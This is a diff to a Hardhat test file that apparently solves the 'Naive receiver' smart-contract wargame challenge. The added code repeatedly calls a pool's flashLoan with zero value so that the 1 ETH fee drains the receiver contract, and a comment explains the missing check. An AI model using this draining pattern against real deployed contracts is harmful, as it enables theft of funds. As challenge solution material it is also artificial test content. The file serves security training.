@@ -37,7 +37,16 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        
+        /**
+         * The fee is 1eth , the contrat have 10 eth
+         * There's not verification that the contract is actually receiving ETH so , we can interect sending 0th
+         * The receiver contract allways will send 1th to the contract so we can empty the SC sending 10 tx with 0value to the flashLoan method
+         */
+        while(parseInt(await ethers.provider.getBalance(receiver.address))>0){
+            await pool.connect(deployer).flashLoan(receiver.address,await pool.ETH(),0,"0x");
+        }
+
     });
 
     after(async function () {
